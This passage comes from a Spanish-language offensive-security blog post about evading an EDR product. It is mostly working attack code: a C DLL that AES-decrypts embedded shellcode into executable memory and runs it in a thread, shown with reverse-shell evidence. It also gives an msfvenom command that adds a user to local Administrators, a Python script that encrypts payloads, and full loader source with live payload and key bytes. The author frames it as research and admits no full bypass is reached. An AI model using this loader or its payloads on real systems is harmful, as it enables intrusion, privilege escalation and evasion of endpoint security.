0x6b, 0x50, 0x6c, 0x4c, 0x6b, 0xb, 0x48, 0x60, 0x8e, 0x23, 0x40, 0xbc, 0x4b, 0x64, 0xea, 0x1e, 0x49, 0xec, 0x6, 0x7d, 0x7, 0x18, 0xe6, 0x25, 0x93, 0xf0, 0x4c, 0x41, 0xcd, 0x6a, 0xce, 0x42, 0xd9, 0x15, 0x3d, 0xa8, 0x46, 0x2b, 0xab, 0x93, 0xa8, 0xd5, 0x59, 0xea, 0x0, 0xb1, 0xe9, 0x36, 0xa9, 0x93, 0xa4, 0xc9, 0xfa, 0x29, 0xfc, 0xf9, 0x4d, 0x7b, 0x5, 0x94, 0x8f, 0x55, 0xe0, 0x21, 0xaf, 0x12, 0x6b, 0xd2, 0x18, 0xf0, 0x9f, 0x5e, 0xf9, 0x53, 0x59, 0x81, 0x15, 0xd7, 0xea, 0xe5, 0x18, 0xe9, 0x45, 0xee, 0x1b, 0x99, 0xee, 0xfd, 0x12, 0x7a, 0x5e, 0x27, 0x21, 0x13, 0xa2, 0xc8, 0x86, 0xfe, 0xc3, 0xcd, 0xeb, 0xee, 0x9d, 0x1d, 0x5a, 0x62, 0xd6, 0xbd, 0x74, 0xb1, 0x64, 0x12, 0xa, 0x37, 0xd1, 0x2e, 0xa5, 0xaf, 0xc8, 0xaf, 0x70, 0xa6, 0x97, 0xea, 0x9b, 0xed, 0x19, 0xd6, 0x73, 0x51, 0x2a, 0x48, 0xac, 0xaa, 0x4d, 0xee, 0xaf, 0xce, 0xf0, 0xfe, 0x4b, 0xee, 0x35, 0x8f, 0x3d, 0xf0, 0x9d, 0xaf, 0x7d, 0x14, 0x82, 0x2a, 0xee, 0xce, 0x5c, 0x1b, 0x4f, 0x39, 0xfb, 0x9f, 0xf4, 0xd4, 0x27, 0x53, 0xa6, 0x40, 0x4e, 0x59, 0xa2 };

extern "C" __declspec(dllexport) void Go(void) {

    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
	unsigned int payload_len = sizeof(payload);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
	}

}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```

Evidencia de la ejecución:

![EDR reverse shell ](/assets/images/EDR_1_reverse_shell.png)

## Creación de un nuevo usuario y añadirlo al grupo de los administradores locales

Del mismo modo tenemos la posibilidad de crear un comando que ejecute en el sistema operativo y que nos proporcione una escalada de privilegios así como persistencia, mediante msfvenom de metaexploit framework:

```
msfvenom -p windows/x64/exec CMD="net user add f0ns1 Passw0rd! && net localgroup Administradores f0ns1 /add" --platform Windows > raw_create_user_administradores.bin
```

Encriptamos el payload con criptografía simétrica mediante AES, script en python:

```python
import sys
from base64 import b64encode
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib

KEY = get_random_bytes(16)
iv = 16 * b'\x00'
cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)

try:
    plaintext = open(sys.argv[1], "rb").read()
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')
print('payload[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };')
```
Salida del proceso:
```python
python ..\aes.py raw_create_user_administradores.bin
AESkey[] = { 0x54, 0xaa, 0xe3, 0xff, 0xf9, 0xfe, 0xa, 0xbc, 0xfe, 0x7d, 0x85, 0x56, 0xb, 0xef, 0xa0, 0x7f };
payload[] = { 0x44, 0x52, 0xdd, 0x48, 0xf2, 0xc5, 0x15, 0x90, 0x9d, 0xc6, 0x72, 0xb9, 0x93, 0x20, 0x43, 0xfd, 0xa7, 0x5, 0xf1, 0xe3, 0x67, 0x89, 0xb9, 0xb0, 0xbe, 0xb0, 0x64, 0xe3, 0x49, 0xc1, 0xea, 0x9e, 0x22, 0xc1, 0xd7, 0xe5, 0x92, 0x68, 0x9b, 0xd5, 0x47, 0x33, 0xe5, 0x28, 0x4f, 0xe9, 0x36, 0x33, 0x32, 0x10, 0xee, 0x37, 0xaa, 0x8f, 0x9a, 0x5e, 0xd6, 0x17, 0x79, 0xd3, 0x20, 0x6b, 0x2e, 0xcc, 0xdb, 0xb6, 0x11, 0x17, 0xda, 0xdb, 0xb0, 0xbd, 0x16, 0xd, 0xe5, 0x83, 0xa3, 0xf8, 0xc7, 0x24, 0xf5, 0x2a, 0xf7, 0x26, 0xc0, 0x58, 0xda, 0x3c, 0xd9, 0x53, 0x8f, 0x27, 0xdf, 0x15, 0x2b, 0x8b, 0xde, 0x95, 0xc6, 0x97, 0xee, 0x3b, 0x3, 0x34, 0x2d, 0x7c, 0x95, 0x9, 0x49, 0xf5, 0xd4, 0x7e, 0x1, 0x1b, 0x4, 0x80, 0x3f, 0x50, 0x52, 0xb1, 0xd0, 0xf4, 0x51, 0xfc, 0x54, 0x68, 0x49, 0xcd, 0xfa, 0x45, 0xc7, 0x27, 0x58, 0x6d, 0x64, 0x3b, 0x3b, 0xf1, 0xd8, 0xa8, 0x9a, 0xd0, 0xad, 0xd2, 0xe8, 0x7a, 0xae, 0xe8, 0x84, 0xc4, 0x3f, 0xc6, 0x69, 0x7a, 0x50, 0xe3, 0x57, 0xcb, 0xa8, 0xe6, 0x49, 0xa8, 0x72, 0x68, 0xb5, 0x4, 0x2e, 0x67, 0x67, 0xe7, 0x3d, 0x6e, 0xd8, 0x88, 0x7c, 0x81, 0xe2, 0x1e, 0xf8, 0xee, 0xdf, 0x1f, 0x86, 0x7c, 0x2a, 0x8b, 0xfe, 0x2e, 0x5c, 0xe, 0x39, 0x4, 0xe5, 0xbf, 0xf3, 0x25, 0xb6, 0x78, 0x9a, 0x20, 0xbf, 0xab, 0x63, 0x99, 0x13, 0x9d, 0x51, 0x51, 0x6e, 0xcb, 0x3d, 0x85, 0xf6, 0xdc, 0xd7, 0x33, 0x52, 0x63, 0x37, 0x33, 0xd9, 0x9a, 0x3e, 0xa7, 0x6d, 0xb5, 0x81, 0x46, 0xbb, 0x29, 0x74, 0x19, 0xe0, 0x2c, 0xee, 0x7a, 0x53, 0xe0, 0xa6, 0x7b, 0x5f, 0xaf, 0xe1, 0xdb, 0x8b, 0x36, 0x29, 0x5b, 0x87, 0xca, 0xe8, 0x7c, 0x36, 0x14, 0x7c, 0x75, 0xc9, 0xed, 0xb3, 0xbe, 0x96, 0x53, 0x89, 0x1, 0x5e, 0x46, 0x94, 0x98, 0x67, 0xb, 0x87, 0xdd, 0x68, 0xd7, 0x90, 0x6f, 0x47, 0x59, 0x66, 0x4b, 0x9b, 0xa7, 0x5e, 0xd2, 0x30, 0x8c, 0xf2, 0xc0, 0xac, 0x9b, 0xed, 0x68, 0xff, 0xf7, 0xd5, 0xc7, 0x9e, 0x49, 0x1c, 0x2, 0x3f, 0xa2, 0x71, 0x7d, 0x25, 0x83, 0xd3, 0xa2, 0x9e, 0xbb, 0x80, 0xc2, 0x29, 0xe9, 0xd3, 0x6e, 0x41, 0xd6, 0x4b, 0x9c, 0xef, 0x5, 0x88, 0x49, 0x96, 0xf6, 0xe7, 0x10, 0x8, 0xfe, 0xcd, 0x19, 0x10, 0x98, 0xd3, 0x40, 0xe5, 0xa2, 0xc, 0x58, 0xa, 0x99, 0x26, 0x46, 0x3c, 0x23, 0x34, 0xfc, 0x83, 0xe6, 0x61, 0x4b, 0x76, 0xb6, 0x13, 0x36, 0x4e, 0x58, 0xc, 0xa8, 0x2f, 0x9b, 0xc8, 0x2, 0x61, 0x3f, 0x22, 0xa5, 0xd2, 0x2f, 0xd8, 0x19, 0x1c, 0x87, 0x4e, 0xec, 0xb8, 0x76, 0x57, 0xce, 0xb5, 0xb8, 0xef, 0xe8 };
```

El código fuente por lo tanto nos quedará del siguiente modo:

```c
#include <winternl.h>
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>




extern "C"{ 
// create_admin_user Administrator group (OS version En)
//unsigned char payload[] =  { 0x7e, 0xb6, 0x5c, 0x44, 0xbf, 0x80, 0x72, 0x30, 0xee, 0xb, 0x1b, 0xf1, 0x62, 0x22, 0x5d, 0x96, 0xa, 0x16, 0x52, 0xfc, 0x26, 0x92, 0xcf, 0xdd, 0x40, 0x94, 0x76, 0x30, 0xcf, 0x49, 0xe9, 0xfc, 0xbc, 0xdf, 0x3a, 0xc, 0xf4, 0xcf, 0xe9, 0x7, 0xfc, 0x7f, 0xf, 0x17, 0xb3, 0x71, 0x6d, 0x3d, 0x71, 0xf4, 0x17, 0xbb, 0xa7, 0x41, 0x4, 0x77, 0x6b, 0x1a, 0xde, 0x67, 0xdb, 0x5f, 0x92, 0x2e, 0xaf, 0x3b, 0x54, 0xe0, 0xfb, 0xcd, 0x18, 0xbe, 0x28, 0x1, 0x30, 0xdd, 0x7a, 0x26, 0x64, 0xe0, 0x17, 0x2f, 0x3f, 0x15, 0x7b, 0xf8, 0x1d, 0x69, 0xeb, 0x92, 0xfe, 0x9b, 0xfd, 0x67, 0xe5, 0xc, 0xf2, 0xe7, 0xbb, 0x65, 0x20, 0x8a, 0xcc, 0xd1, 0xc5, 0x8a, 0x9d, 0x39, 0x7d, 0xcb, 0xd5, 0x3, 0xf2, 0x1f, 0xac, 0x45, 0xe7, 0x93, 0x36, 0xc5, 0x0, 0x7a, 0xc3, 0x6f, 0xe4, 0x72, 0x8f, 0x95, 0x86, 0x74, 0xcf, 0x30, 0xc1, 0xb8, 0x29, 0xee, 0xd2, 0xf3, 0x8b, 0xa8, 0xac, 0x3c, 0x95, 0xc9, 0xd6, 0x21, 0x36, 0x62, 0x5e, 0x9f, 0x2b, 0xf8, 0xc4, 0xb4, 0x4e, 0x12, 0xe4, 0xb, 0x29, 0x68, 0x87, 0xf0, 0xe0, 0x8f, 0x63, 0x10, 0xe0, 0xeb, 0x5b, 0xaf, 0xf8, 0x4a, 0x7d, 0xb, 0x51, 0x8c, 0x30, 0x2, 0xb3, 0x7e, 0xec, 0x5, 0x43, 0x2d, 0x8d, 0x91, 0x33, 0x22, 0x6e, 0x1a, 0xa0, 0x60, 0x3a, 0xc1, 0x17, 0x73, 0x8d, 0xd3, 0x4f, 0x27, 0x25, 0x56, 0x19, 0x7b, 0xa8, 0xc, 0xfb, 0xe7, 0x4e, 0x23, 0xe9, 0x99, 0x59, 0x18, 0xef, 0xd4, 0x8a, 0xf0, 0x15, 0x9d, 0xd7, 0x9f, 0x37, 0x5f, 0x89, 0x56, 0x48, 0xb1, 0x7b, 0x82, 0x5b, 0xdd, 0xa0, 0x54, 0x7f, 0x91, 0xc9, 0xc1, 0xa, 0x15, 0x11, 0x48, 0x4e, 0xb3, 0x32, 0x37, 0xe1, 0x79, 0xcd, 0x4b, 0x98, 0xc, 0x21, 0x0, 0x4, 0xc9, 0x6d, 0x90, 0xe6, 0x9a, 0xef, 0xf9, 0x81, 0xab, 0x13, 0x4b, 0x4f, 0x43, 0xb4, 0xa9, 0xa7, 0x74, 0x2f, 0xa0, 0xf7, 0x28, 0xed, 0x30, 0xb3, 0x91, 0xcb, 0x9c, 0x42, 0xf8, 0xcf, 0x63, 0x4, 0xe5, 0x82, 0x98, 0xe5, 0x93, 0x37, 0x5, 0x9a, 0xe3, 0x56, 0x96, 0x16, 0x6f, 0x31, 0x8d, 0x33, 0xb1, 0x90, 0x66, 0x57, 0xd1, 0x7c, 0xe3, 0xa6, 0xd8, 0x34, 0x9b, 0xc3, 0xaa, 0x29, 0x8d, 0x3d, 0x97, 0xff, 0xc1, 0x8b, 0x98, 0x20, 0x90, 0x93, 0x8f, 0x8c, 0x44, 0xdf, 0x8a, 0x14, 0x15, 0xfc, 0x81, 0xaf, 0x43, 0x68, 0x4d, 0xb0, 0x33, 0xf9, 0x67, 0x4e, 0xe7, 0x9b, 0xe9, 0x68, 0xa2, 0x4, 0x81, 0xe8, 0xf8, 0x34, 0x59, 0xdb, 0x12, 0xb4, 0xcd, 0x8, 0x37, 0x2c, 0xd3, 0x66, 0xdd, 0xe8, 0xbe, 0xd1, 0x9e, 0x62, 0xe5, 0x64, 0x1a, 0x8d, 0x9e, 0x65, 0x19, 0x8f, 0x44, 0xce, 0x87, 0xd, 0x63 };
//unsigned char key[] = { 0x73, 0xbd, 0xab, 0x26, 0x32, 0x46, 0x29, 0x9b, 0x6, 0xeb, 0xc, 0x5d, 0x43, 0x39, 0x66, 0x53 };
// create_admin_user grupo Administradores (OS version Es)
unsigned char payload[] = { 0x44, 0x52, 0xdd, 0x48, 0xf2, 0xc5, 0x15, 0x90, 0x9d, 0xc6, 0x72, 0xb9, 0x93, 0x20, 0x43, 0xfd, 0xa7, 0x5, 0xf1, 0xe3, 0x67, 0x89, 0xb9, 0xb0, 0xbe, 0xb0, 0x64, 0xe3, 0x49, 0xc1, 0xea, 0x9e, 0x22, 0xc1, 0xd7, 0xe5, 0x92, 0x68, 0x9b, 0xd5, 0x47, 0x33, 0xe5, 0x28, 0x4f, 0xe9, 0x36, 0x33, 0x32, 0x10, 0xee, 0x37, 0xaa, 0x8f, 0x9a, 0x5e, 0xd6, 0x17, 0x79, 0xd3, 0x20, 0x6b, 0x2e, 0xcc, 0xdb, 0xb6, 0x11, 0x17, 0xda, 0xdb, 0xb0, 0xbd, 0x16, 0xd, 0xe5, 0x83, 0xa3, 0xf8, 0xc7, 0x24, 0xf5, 0x2a, 0xf7, 0x26, 0xc0, 0x58, 0xda, 0x3c, 0xd9, 0x53, 0x8f, 0x27, 0xdf, 0x15, 0x2b, 0x8b, 0xde, 0x95, 0xc6, 0x97, 0xee, 0x3b, 0x3, 0x34, 0x2d, 0x7c, 0x95, 0x9, 0x49, 0xf5, 0xd4, 0x7e, 0x1, 0x1b, 0x4, 0x80, 0x3f, 0x50, 0x52, 0xb1, 0xd0, 0xf4, 0x51, 0xfc, 0x54, 0x68, 0x49, 0xcd, 0xfa, 0x45, 0xc7, 0x27, 0x58, 0x6d, 0x64, 0x3b, 0x3b, 0xf1, 0xd8, 0xa8, 0x9a, 0xd0, 0xad, 0xd2, 0xe8, 0x7a, 0xae, 0xe8, 0x84, 0xc4, 0x3f, 0xc6, 0x69, 0x7a, 0x50, 0xe3, 0x57, 0xcb, 0xa8, 0xe6, 0x49, 0xa8, 0x72, 0x68, 0xb5, 0x4, 0x2e, 0x67, 0x67, 0xe7, 0x3d, 0x6e, 0xd8, 0x88, 0x7c, 0x81, 0xe2, 0x1e, 0xf8, 0xee, 0xdf, 0x1f, 0x86, 0x7c, 0x2a, 0x8b, 0xfe, 0x2e, 0x5c, 0xe, 0x39, 0x4, 0xe5, 0xbf, 0xf3, 0x25, 0xb6, 0x78, 0x9a, 0x20, 0xbf, 0xab, 0x63, 0x99, 0x13, 0x9d, 0x51, 0x51, 0x6e, 0xcb, 0x3d, 0x85, 0xf6, 0xdc, 0xd7, 0x33, 0x52, 0x63, 0x37, 0x33, 0xd9, 0x9a, 0x3e, 0xa7, 0x6d, 0xb5, 0x81, 0x46, 0xbb, 0x29, 0x74, 0x19, 0xe0, 0x2c, 0xee, 0x7a, 0x53, 0xe0, 0xa6, 0x7b, 0x5f, 0xaf, 0xe1, 0xdb, 0x8b, 0x36, 0x29, 0x5b, 0x87, 0xca, 0xe8, 0x7c, 0x36, 0x14, 0x7c, 0x75, 0xc9, 0xed, 0xb3, 0xbe, 0x96, 0x53, 0x89, 0x1, 0x5e, 0x46, 0x94, 0x98, 0x67, 0xb, 0x87, 0xdd, 0x68, 0xd7, 0x90, 0x6f, 0x47, 0x59, 0x66, 0x4b, 0x9b, 0xa7, 0x5e, 0xd2, 0x30, 0x8c, 0xf2, 0xc0, 0xac, 0x9b, 0xed, 0x68, 0xff, 0xf7, 0xd5, 0xc7, 0x9e, 0x49, 0x1c, 0x2, 0x3f, 0xa2, 0x71, 0x7d, 0x25, 0x83, 0xd3, 0xa2, 0x9e, 0xbb, 0x80, 0xc2, 0x29, 0xe9, 0xd3, 0x6e, 0x41, 0xd6, 0x4b, 0x9c, 0xef, 0x5, 0x88, 0x49, 0x96, 0xf6, 0xe7, 0x10, 0x8, 0xfe, 0xcd, 0x19, 0x10, 0x98, 0xd3, 0x40, 0xe5, 0xa2, 0xc, 0x58, 0xa, 0x99, 0x26, 0x46, 0x3c, 0x23, 0x34, 0xfc, 0x83, 0xe6, 0x61, 0x4b, 0x76, 0xb6, 0x13, 0x36, 0x4e, 0x58, 0xc, 0xa8, 0x2f, 0x9b, 0xc8, 0x2, 0x61, 0x3f, 0x22, 0xa5, 0xd2, 0x2f, 0xd8, 0x19, 0x1c, 0x87, 0x4e, 0xec, 0xb8, 0x76, 0x57, 0xce, 0xb5, 0xb8, 0xef, 0xe8 };
unsigned char key[] = { 0x54, 0xaa, 0xe3, 0xff, 0xf9, 0xfe, 0xa, 0xbc, 0xfe, 0x7d, 0x85, 0x56, 0xb, 0xef, 0xa0, 0x7f };

int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;
        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                        return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                        return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                        return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                        return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
                        return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}
__declspec(dllexport) void f0ns1(void) {
    void * exec_mem;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
	unsigned int payload_len = sizeof(payload);
	exec_mem = VirtualAlloc(0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));
	RtlMoveMemory(exec_mem, payload, payload_len);
	rv = VirtualProtect(exec_mem, payload_len, PAGE_EXECUTE_READ, &oldprotect);
	if ( rv != 0 ) {
					th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
					WaitForSingleObject(th, -1);
	}

}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

```
Y la evidencia de su ejecución:

![EDR create Admin user](/assets/images/EDR_1_create_user.png)






# Conslusiones y siguientes pasos

Podemos considerar que tenemos el bypass, bajo mi punto de vista no. SOlo podemos afirmar que es posible inyectar código y ejecutar comandos que tendrar un nuevo proceso/hilo bajo un contexto que estará auditado en el EDR.
Tiene pinta, de que será el camino junto a las DLL reflectivas.

Espero que os pareciera interasante.

[back](./)